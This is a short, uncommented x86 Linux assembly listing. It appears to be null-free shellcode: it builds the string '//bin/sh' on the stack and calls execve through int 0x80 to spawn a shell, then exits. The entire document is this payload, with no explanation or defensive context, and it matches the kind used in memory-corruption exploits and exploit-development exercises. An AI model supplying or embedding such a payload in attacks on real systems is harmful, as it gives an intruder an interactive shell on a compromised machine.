section .text
global _start
 
_start:
; execve
   xor    eax, eax
   push   eax
   push   word 0x6873
   push   word 0x2f6e
   push   word 0x6962
   push   word 0x2f2f
   mov    ecx, esp
   mov    ebx, eax
   xchg   ecx, ebx
   mov    edx, eax
   add    al, 0xb
   int    0x80
; exit
   xor    eax, eax
   mov    al, 0x1
   int    0x80
